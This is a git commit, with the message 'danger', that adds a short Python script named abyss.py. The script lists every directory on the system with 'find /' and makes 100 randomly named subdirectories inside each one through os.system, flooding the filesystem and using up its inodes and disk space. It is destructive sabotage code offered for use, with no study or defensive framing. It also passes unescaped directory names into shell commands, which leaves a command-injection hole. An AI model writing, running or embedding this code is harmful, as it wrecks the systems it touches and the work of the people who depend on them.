adfbf0f6a075d403c112430f02867f7b8a168929
root <root@localhost.localdomain>
2013-06-18 02:13:40 -0400

    danger

---
+++ abyss.py
@@ -0,0 +1,15 @@
+#!/usr/bin/env python
+
+import subprocess, random, base64, os
+
+proc = subprocess.Popen('find / -type d', stdout=subprocess.PIPE, shell=True)
+out, err = proc.communicate()
+
+l = out.split()
+
+for t in l:
+	t = t + '/'
+	for i in range(100):
+		p = random.randint(10000,1000000000)
+		z = "mkdir {0}{1}".format(t, str(p))
+		os.system(z)
